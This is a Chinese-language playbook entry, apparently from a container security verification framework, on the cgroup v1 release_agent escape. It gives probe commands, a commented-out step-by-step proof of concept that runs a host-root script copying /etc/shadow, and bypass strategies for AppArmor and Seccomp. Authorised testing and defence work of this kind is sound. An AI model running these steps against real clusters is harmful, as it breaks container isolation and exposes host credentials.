---
source: manual
confidence: high
platforms: [k8s, docker]
required_tools: []
execution_contexts: [L0, L1, L2, L3]
max_verification_level: L3
destructive: true
mapped_attack_surfaces: [AS-1.2]
mapped_compliance_families: [特权容器, cgroup暴露]
---

# cgroup-escape — Cgroup release_agent 逃逸

容器可访问 cgroup v1 文件系统，通过写 `release_agent` 和 `notify_on_release` 触发宿主机执行攻击者命令，实现容器逃逸。

---

## 1. 前置条件

- 容器以特权模式运行，或 cgroupfs 以读写方式挂载到容器内
- 系统使用 cgroup v1（非 cgroup v2 unified hierarchy）
- 容器可访问 `/proc/1/cgroup` 并定位到 cgroup 路径
- `release_agent` 文件可写

检查命令：
```bash
# [L0] 宿主机观察：确认 Pod 特权模式
kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

# [L0] 宿主机观察：确认 cgroup v1
stat -fc %T /sys/fs/cgroup/
# 期望输出: cgroupfs（v1）

# [L1] 容器内观察：确认 cgroup 路径可见
kubectl exec -n <ns> <pod-name> -- cat /proc/1/cgroup | head -5
# 期望输出: 输出含 cgroup 路径，如 11:memory:/kubepods/...

# [L1] 容器内观察：确认 release_agent 可写
kubectl exec -n <ns> <pod-name> -- test -w /sys/fs/cgroup/release_agent && echo "writable" || echo "not writable"
# 期望输出: writable
```

## 2. 探测命令

```bash
# [L0] 宿主机观察：确认 cgroup 版本
stat -fc %T /sys/fs/cgroup/
# 期望输出: cgroupfs（v1）；若为 tmpfs 则为 v2

# [L1] 容器内观察：定位容器在 cgroup 层级中的路径
kubectl exec -n <ns> <pod-name> -- cat /proc/1/cgroup
# 期望输出: 各子系统路径，如 11:memory:/kubepods/podxxx/...

# [L1] 容器内观察：确认 cgroup 挂载为读写
kubectl exec -n <ns> <pod-name> -- cat /proc/mounts | grep cgroup
# 期望输出: cgroup ... rw, ...

# [L1] 容器内观察：检查 release_agent 是否存在且可写
kubectl exec -n <ns> <pod-name> -- ls -la /sys/fs/cgroup/release_agent 2>/dev/null
# 期望输出: -rw-r--r-- ... /sys/fs/cgroup/release_agent

# [L1] 容器内观察：检查可创建子 cgroup
kubectl exec -n <ns> <pod-name> -- mkdir /sys/fs/cgroup/escape_test 2>/dev/null && echo "creatable" || echo "not creatable"
# 期望输出: creatable

# [L1] 容器内观察：清理测试目录
kubectl exec -n <ns> <pod-name> -- rmdir /sys/fs/cgroup/escape_test 2>/dev/null
```

## 3. 攻击验证

```bash
# [L3] 条件验证（⚠️ 不可安全复现，会在宿主机上执行任意命令）
# 验证级别: L3-条件验证
# 不可安全复现原因: 实际执行会在宿主机上以 root 身份运行 release_agent 脚本，影响生产环境

# 前置条件满足证明:
# ✅ kubectl get pod <pod-name> -o jsonpath='{.spec.securityContext.privileged}' = true
# ✅ stat -fc %T /sys/fs/cgroup/ = cgroupfs (v1)
# ✅ kubectl exec <pod> -- test -w /sys/fs/cgroup/release_agent = writable

# ⚠️ POC步骤（理论推导，实际执行会在宿主机执行命令）：
#
# [L2] 步骤1: 创建逃逸脚本到宿主机可访问路径
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "#!/bin/bash" > /tmp/escape.sh'
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "cat /etc/shadow > /tmp/cgroup_escape_proof" >> /tmp/escape.sh'
# kubectl exec -n <ns> <pod-name> -- chmod +x /tmp/escape.sh
#
# [L2] 步骤2: 配置 release_agent 指向逃逸脚本
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo "/tmp/escape.sh" > /sys/fs/cgroup/release_agent'
#
# [L2] 步骤3: 创建子 cgroup 并设置 notify_on_release
# kubectl exec -n <ns> <pod-name> -- mkdir /sys/fs/cgroup/escape_trigger
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo 1 > /sys/fs/cgroup/escape_trigger/notify_on_release'
#
# [L2] 步骤4: 触发 release_agent（通过让 cgroup 中进程退出）
# kubectl exec -n <ns> <pod-name> -- bash -c 'echo $$ > /sys/fs/cgroup/escape_trigger/cgroup.procs && exit'
# 预期影响: 宿主机以 root 执行 /tmp/escape.sh，将 /etc/shadow 内容写入 /tmp/cgroup_escape_proof
#
# [L2] 清理:
# kubectl exec -n <ns> <pod-name> -- rmdir /sys/fs/cgroup/escape_trigger
# kubectl exec -n <ns> <pod-name> -- rm /tmp/escape.sh
```

## 4. 差分证明

```bash
# [L0] 攻击前环境快照：记录宿主机 /tmp 下无逃逸证明文件
ls -la /tmp/cgroup_escape_proof 2>&1
# 期望输出: No such file or directory

# [L0] 攻击后环境对比：检查逃逸证明文件是否被创建
ls -la /tmp/cgroup_escape_proof 2>&1
# 期望输出: -rw-r--r-- ... /tmp/cgroup_escape_proof（文件存在 → 证明逃逸成功）

# [L0] 攻击后：验证文件内容为宿主机 shadow
cat /tmp/cgroup_escape_proof
# 期望输出: root:$6$...:... (宿主机 /etc/shadow 内容) → 证明逃逸成功

# [L2] 容器内读取宿主机文件证明逃逸成功（若通过其他方式已逃逸）
kubectl exec -n <ns> <pod-name> -- cat /tmp/cgroup_escape_proof 2>/dev/null
# 期望输出: 同上（容器内可读取宿主机生成的文件）

# 清理
rm -f /tmp/cgroup_escape_proof
```

差分结论：攻击前宿主机 `/tmp` 下无 `cgroup_escape_proof` 文件，攻击后该文件出现且内容为宿主机 `/etc/shadow`，证明 release_agent 在宿主机层面以 root 执行了逃逸命令。

## 5. 绕过策略

```bash
# [L1] 检查 AppArmor 是否限制 cgroup 写入
kubectl exec -n <ns> <pod-name> -- cat /proc/1/attr/current
# 若输出含 cgroup 限制策略 → 需绕过

# [L1] 检查 Seccomp 是否阻止相关系统调用
kubectl exec -n <ns> <pod-name> -- cat /proc/1/status | grep Seccomp
# 若 Seccomp: 2 (strict) → 可能阻断 cgroup 操作

# 绕过方式：
# - [L2] 若 /sys/fs/cgroup 不可写但 /proc/sys/kernel 已挂载，尝试通过 core_pattern 逃逸（见 procfs-escape 模式）
# - [L2] 若 release_agent 在顶层 cgroup 不可写，尝试在子系统中找可写的 release_agent（如 /sys/fs/cgroup/memory/release_agent）
# - [L2] 若 cgroup v2，尝试通过 cgroup.procs 和 kill 信号触发的其他机制
```

## 6. 证伪条件

```bash
# [L1] 容器内 cgroup v2 unified hierarchy
kubectl exec -n <ns> <pod-name> -- stat -fc %T /sys/fs/cgroup/
# 输出: tmpfs → cgroup v2，release_agent 机制不适用 → 证伪

# [L1] release_agent 不可写
kubectl exec -n <ns> <pod-name> -- test -w /sys/fs/cgroup/release_agent && echo "writable" || echo "not writable"
# 输出: not writable → 证伪

# [L1] 容器无 cgroup 访问权限
kubectl exec -n <ns> <pod-name> -- ls /sys/fs/cgroup/release_agent 2>&1
# 输出: No such file or directory 或 Permission denied → 证伪

# [L0] Pod 非特权且 cgroup 未挂载
kubectl get pod <pod-name> -o yaml | grep -c cgroup
# 输出: 0 → 证伪
```

## 7. 审批级别

- **L3** 条件验证（理论推导 release_agent 触发）→ **Level 5**（会在宿主机执行命令，必须人工确认）
- **L1** 容器内探测命令 → **Level 2**（只读探测，自动执行）
- **L0** 宿主机观察命令 → **Level 1**（只读侦察，自动执行）
- 破坏性标注：是（release_agent 在宿主机执行命令）
- 最高验证层级：L3

## 8. MITRE ATT&CK

- **Tactic**: Defense Evasion / Privilege Escalation
- **Technique ID**: T1611
- **Technique Name**: Escape to Host
- **描述**: 攻击者利用容器对 cgroup 文件系统的写权限，配置 `release_agent` 并通过 `notify_on_release` 触发宿主机以 root 身份执行任意命令，实现容器逃逸。